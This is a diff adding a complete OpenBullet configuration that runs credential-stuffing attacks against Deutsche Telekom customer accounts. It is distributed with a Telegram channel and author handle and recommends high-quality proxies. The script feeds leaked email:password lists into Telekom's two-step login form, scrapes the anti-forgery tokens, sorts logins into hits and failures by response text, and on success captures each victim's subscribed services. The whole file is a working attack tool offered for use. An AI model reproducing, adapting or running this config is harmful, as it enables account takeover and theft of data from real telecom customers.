@@ -1,0 +1,117 @@
+[SETTINGS]
+{
+  "Name": "Telekom.com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-03T15:23:12.1540174+03:30",
+  "AdditionalInfo": "Telegram Channel: T.me/OpenBulletChannel | Need HQ Proxy | Capture | CPM Rate: 20-200",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#US FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#PS FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+#KK REQUEST GET "https://www.telekom.de/kundencenter/login?redirectUrl=%2Fkundencenter%2Fstartseite&amp;showCancelButton=false" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Xs PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"" "\">" -> VAR "Xs" 
+
+#Xsrf FUNCTION Replace "\" value=\"" "=" "<Xs>" -> VAR "Xsrf" 
+
+#Tid PARSE "<SOURCE>" LR "name=\"tid\" value=\"" "\"" -> VAR "Tid" 
+
+#L1 FUNCTION Length "<Xsrf>&tid=<Tid>&x-show-cancel=false&pw_usr=<US>&pw_submit=&hidden_pwd=" -> VAR "L1" 
+
+#Post_User REQUEST POST "https://accounts.login.idm.telekom.com/factorx" 
+  CONTENT "<Xsrf>&tid=<Tid>&x-show-cancel=false&pw_usr=<US>&pw_submit=&hidden_pwd=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: accounts.login.idm.telekom.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: <L1>" 
+  HEADER "Origin: https://accounts.login.idm.telekom.com" 
+  HEADER "Connection: close" 
+  HEADER "Referer: https://accounts.login.idm.telekom.com/oauth2/auth?response_type=code&client_id=10LIVESAM30000004901YETI0000000000000000&scope=openid&redirect_uri=https%3A%2F%2Fmeinkonto.telekom-dienste.de%2Ftelekom%2Fopenid_connect_login&nonce=3f3b99f9acfc&state=3383653336118&claims=%7B%22id_token%22%3A%7B%22urn%3Atelekom.com%3Aall%22%3A%7B%22essential%22%3Atrue%7D%7D%7D&logout_uri=https%3A%2F%2Fmeinkonto.telekom-dienste.de%2Ftelekom%2Flogout" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Benutzername ist nicht korrekt." 
+  KEYCHAIN Success OR 
+    KEY "Telekom Login Passwort eingeben" 
+
+#Xs2 PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"" "\">" -> VAR "Xs2" 
+
+#p1 PARSE "<Xs2>" LR "xsrf_" "\"" -> VAR "p1" 
+
+#p2 PARSE "<Xs2>" LR "value=\"" "" -> VAR "p2" 
+
+#Xsrf2 FUNCTION Constant "xsrf_<p1>=<p2>" -> VAR "Xsrf2" 
+
+#L2 FUNCTION Length "<Xsrf2>&tid=<Tid>&hidden_usr=<US>&pw_pwd=<PS>&pw_submit=" -> VAR "L2" 
+
+#Post_Pass REQUEST POST "https://accounts.login.idm.telekom.com/factorx" 
+  CONTENT "<Xsrf2>&tid=<Tid>&hidden_usr=<US>&pw_pwd=<PS>&pw_submit=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: <L2>" 
+  HEADER "Host: accounts.login.idm.telekom.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://accounts.login.idm.telekom.com" 
+  HEADER "Connection: close" 
+  HEADER "Referer: https://accounts.login.idm.telekom.com/factorx" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Passwort ist nicht korrekt." 
+  KEYCHAIN Success OR 
+    KEY "Logout" 
+    KEY "<ADDRESS>" Contains "https://meinkonto.telekom-dienste.de/telekom/failure/index.xhtml" 
+
+#Cap REQUEST GET "https://meinkonto.telekom-dienste.de/kundencenter/index.xhtml" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#KIR1 PARSE "<SOURCE>" LR "<h2>Ihre Dienste</h2>" "<h2>Weitere Dienste und Empfehlungen</h2>" -> VAR "KIR1" 
+
+#Service PARSE "<KIR1>" LR "<p class=\"text-large\">" "</p>" Recursive=TRUE CreateEmpty=FALSE -> CAP "Service" 
+
